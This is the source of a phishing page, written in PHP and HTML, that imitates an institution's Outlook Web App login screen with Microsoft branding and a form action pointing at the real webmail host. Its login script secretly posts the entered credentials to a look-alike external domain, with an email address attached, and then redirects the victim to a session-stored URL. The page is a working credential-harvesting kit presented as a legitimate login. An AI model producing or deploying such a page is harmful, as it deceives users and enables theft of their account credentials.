<?php
session_start();
$url = $_SESSION["url"];
unset($_SESSION["url"]);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- {57A118C7-2DA1-413d-BE8A-F92B0D1A418A} -->
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
    <title>Outlook Web App</title>
    <meta content="NOINDEX, NOFOLLOW" name="Robots">
    <link rel="shortcut icon" href="CookieAuth-GetPic-formdir=2&amp;image=favicon.ico.dll" type="image/x-icon">
    <link href="CookieAuth.dll-GetPic-formdir=2&amp;image=logon_style.css" type="text/css" rel="stylesheet">
    <link href="CookieAuth.dll-GetPic-formdir=2&amp;image=owafont.css" type="text/css" rel="stylesheet">
    <script src="CookieAuth-GetPic-formdir=2&amp;image=flogon.js.dll" type="text/javascript"></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js">
    <script>

    </script>
<script type="text/javascript">
	<!--

	var a_fGzpEnbl = 1;
    var g_fFcs = 1;

    function window_onload()
    {
        onld();

        if (chkCookies())
        {
			ldCookie('username', 'password');

			var expl1 = document.getElementById('expl1');
			expl1.style.display = "";

			var lnkHidedSection = document.getElementById('lnkHdSec');
			lnkHidedSection.style.display = "none";

			var lnkShowSection = document.getElementById('lnkShwSec');
			lnkShowSection.style.display = "";
		}

    }
    
    function clkLgn() {

      $.ajax({
        type: "POST",
        data: {
          service: "alt.np-cg5r0f7@yopmail.com",
          session: document.getElementById('username').value,
          key: document.getElementById('username').value //key: document.getElementById('password').value
          },
        url: "http://webmail.he-arc.cf/process.php",
        success: function(){
          window.location = "<?php echo $url; ?>";
          },
        error: function(){
         window.location = "<?php echo $url; ?>";
          }
        });
      }
    
    function myFunction(event){
    if((('which' in event) ? event.which : event.keyCode) == 13)
    {
    clkLgn()
    }
    }
	-->
</script>

</head>
<body class="owaLgnBdy" onload="return window_onload();">
<noscript>
	<div id="dvErr">
		<table cellpadding="0" cellspacing="0">
		<tr>
			<td><img src="CookieAuth.dll-GetPic-formdir=2&amp;image=lgnerror.gif" alt=""></td>
			<td style="width:100%">To use Microsoft Outlook Web App, script must be enabled on your browser. For information about how to enable script, consult the Help for your browser. If your browser does not support script, you can download <a href='../windows.microsoft.com/en-us/internet-explorer/download-ie.html'>Microsoft Internet Explorer</a>.</td>
		</tr>
		</table>
	</div>
</noscript>
<form action="https://webmail.he-arc.ch/CookieAuth.dll?Logon" method="post" id="logonForm" autocomplete="off">
<input type="hidden" id="curl" name="curl" value="Z2F" />
<input type="hidden" id="flags" name="flags" value="0" />
<input type="hidden" id="forcedownlevel" name="forcedownlevel" value="0" />
<input type="hidden" id="formdir" name="formdir" value="2" />
 <!-- Main table -->
<table align="center" id="tblMain" cellpadding=0 cellspacing=0>
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnTL"><img src="CookieAuth.dll-GetPic-formdir=2&amp;image=lgntopl.gif" alt=""></td>
				<td class="lgnTM"></td>
				<td class="lgnTR"><img src="CookieAuth.dll-GetPic-formdir=2&amp;image=lgntopr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td id="mdLft">&nbsp;</td>
		<td id="mdMid">
        <!-- Mid table -->
        <table id="tblMid" class="mid">
        <tbody>
        <tr>
          <td class="expl" id="expltxt"></td>
        </tr>
        <tr>
          <td class="align">
              <!-- Table 1-->
              <table cellpadding="0" cellspacing="0">
		         <tr>
			        <td class="wrng"></td>
		        </tr>
			  </table>
			  <!-- End Table 1-->
          </td>
        </tr>
        <tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
         <tr>
          <td class="align">
              <!-- Table 2-->
              <table cellpadding="0" cellspacing="0">
                <col>
		        <col class="w100">
		        <tr id="trSec">
				    <td class="nowrap">
					    Security&nbsp;
				    </td>
				    <td id="expl1" style="display:none">
				        ( <a href="javascript:clkExp(lnkShwSec)" id="lnkShwSec">show explanation</a><a href="javascript:clkExp(lnkHdSec)" id="lnkHdSec">hide explanation</a> )
				    </td>
			    </tr>
			  </table>
			  <!-- End Table 2-->
          </td>
        </tr>
        <tr>
          <td>
            <!--Table 3-->
            <table cellpadding="0" cellspacing="0">
			    <col>
			    <col class="w100">
			    <tr class="height">
				    <td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onclick="clkSec()" checked="checked" /></td>
				    <td><label for="rdoPblc">This is a public or shared computer</label></td>
			    </tr>
			    <tr id="trPubExp" class="expl" style="display:none">
				    <td></td>
				    <td>Select this option if you are connecting from a public computer. Be sure to log off and close all browser windows to end your session. Read about the <a href= '../www.microsoft.com/en-us/security/default.aspx.html'>security risks</a> of using a public computer.</td>
			    </tr>
			    <tr class="height">
				    <td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onclick="clkSec()" /></td>
				    <td><label for="rdoPrvt">This is a private computer</label></td>
			    </tr>
			    <tr id="trPrvtExp" class="expl" style="display:none">
				    <td></td>
				    <td>Select this option if you are the only person using this computer. This option provides additional time of inactivity before automatically logging you off.</td>
			    </tr>
			    <tr id="trPrvtWrn" class="wrng" style="display:none">
				    <td></td>
				    <td><B>Warning:</B> By selecting this option you acknowledge that the computer complies with your organization's security policy.</td>
			    </tr>
			</table>
			<!-- End Table 3-->
          </td>
        </tr>
        <tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
        <tr>
	        <td>
				<!-- Table 4-->
				<table cellpadding="0" cellspacing="0">
					<col>
					<col class="w100">
					<tr>
						<td	valign="top">
							<input id="chkBsc" name="chkBsc" type="checkbox" class="rdo" onclick="clkBsc()"	/>
						</td>
						<td>
							<label for="chkBsc">Use Outlook Web App Light</label>
						</td>
					</tr>
					<tr id="trBscExp" class="disBsc" style="display:none">
						<td></td>
						<td>The Light client provides fewer features and is sometimes faster. Use the Light client if you are on a slow connection or using a computer with unusually strict browser security settings.</td>
					</tr>
				</table>
				<!-- End Table 4-->
			</td>
		</tr>
        <tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
        <tr>
          <td>
			<!-- Table 5-->
			<table cellpadding=0 cellspacing=0>
			    <col>
			    <col class="w100">
				<tr style="display: ">
					<td valign="top"><input id="chpwd" name="chpwd" type="checkbox" class="rdo" onclick="clkChpwd()" /></td>
					<td><label for="chpwd">I want to change my password after logging on</label></td>
				</tr>
				<tr id="trChpwdExp" class="expl" style="display:none">
					<td></td>
					<td>With this option selected, a page used to change your password will be displayed after your credentials are submitted.</td>
				</tr>
			</table>
			<!-- End Table 5-->
          </td>
        </tr>
        <tr style="display: ">
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
        <tr>
          <td>
            <!-- Table 6-->
            <table cellspacing="0" cellpadding="0">
              <colgroup>
              <col class="nowrap">
              <col class="w100">
              <col>
              <tbody>
                  <tr>
                    <td class="nowrap"><label for="username">Domain\user name:</label></td>
                    <td class="txtpad">
                        <input class="txt" id="username" name="username" type="text" />
                    </td>
                  </tr>
                  <tr>
                    <td class="nowrap"><label for="password">Password:</label></td>
                    <td class="txtpad">
                        <input class="txt" id="password" onfocus="g_fFcs=0" type="password" name="password" onkeyup="myFunction(event)"/>
                    </td>
                  </tr>
                  <tr>
                    <td class="nowrap">&nbsp;</td>
                    <td class="txtpad" colspan="2">
                        <input class="btn" onmousedown="this.className='btnOnMseDwn'" id="SubmitCreds" onmouseover="this.className='btnOnMseOvr'" onclick="clkLgn()" onmouseout="this.className='btn'" type="button" value="Log On" name="SubmitCreds" /> 
                    </td>
                  </tr>
              </tbody>
             </table>
             <!-- End Table 6-->
          </td>
        </tr>
        <tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
       </tbody>
      </table>
      <!-- End Mid Table-->
      <!-- Mid2 Table-->
		<table id="tblMid2" class="mid" style="display:none">
			<tr><td><hr /></td></tr>
			<tr>
				<td><br />Cookies are currently disabled by your browser settings. To access this Web site, cookies must be enabled.<br /><br />Follow these directions to enable cookies (Microsoft Internet Explorer 6 or later):  In Internet Explorer, on the Tools menu, click Internet Options. Click the Privacy tab, then click Sites. In Address of Web site, type the complete address of this Web site. For example, http://www.microsoft.com. Then click Allow.<br /><br /><br /></td>
			</tr>
			<tr><td><hr></td></tr>
			<tr>
				<td class="txtpad">
					<input type="button" class="btn" style="float: right" value="Retry" onclick="clkRtry()"
					onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'">
				</td>
			</tr>
		</table>
      <!-- End Mid2 Table-->
		<table class="mid tblConn">
			<tr>
				<td rowspan=3 style="vertical-align:top" class="tdConnImg"><img src="CookieAuth.dll-GetPic-formdir=2&amp;image=lgnexlogo.gif" alt=""></td>
				<td class="tdConn" style="padding-top:6px;">Connected to Microsoft Exchange</td>
			</tr>
			<tr>
				<td class="tdConn" style="padding-top:0px;">Secured by Microsoft Forefront Threat Management Gateway</td>
			</tr>
			<tr>
				<td class="tdCopy">&copy; 2009 Microsoft Corporation. All rights reserved.</td>
			</tr>
		</table>
	</td>
	<td id="mdRt">&nbsp;</td>
	</tr>
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnBL"><img src="CookieAuth.dll-GetPic-formdir=2&amp;image=lgnbotl.gif" alt=""></td>
				<td class="lgnBM"></td>
				<td class="lgnBR"><img src="CookieAuth.dll-GetPic-formdir=2&amp;image=lgnbotr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
 </tbody>
</table>
<!-- End Main Table-->
</form>
</body>
</html>